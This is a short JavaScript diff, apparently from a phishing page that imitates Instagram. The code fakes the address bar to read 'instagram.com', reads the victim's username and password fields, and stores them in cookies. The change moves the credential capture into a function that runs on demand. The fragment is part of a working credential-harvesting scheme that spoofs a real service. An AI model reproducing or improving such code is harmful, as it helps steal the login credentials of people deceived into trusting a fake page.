@@ -17,9 +17,10 @@ if (cookie.includes("WasHere=true")) {
 
 }
         window.history.pushState("#", "#", "instagram.com");
-         var pw = document.getElementById("password").value
-       var user = document.getElementById("username").value
+      
        var Run = function myfunction(){
+             var pw = document.getElementById("password").value
+       var user = document.getElementById("username").value
           var cookie = document.cookie;
             document.cookie = "WasHere=true"
           document.cookie = "user1=" + user + ""
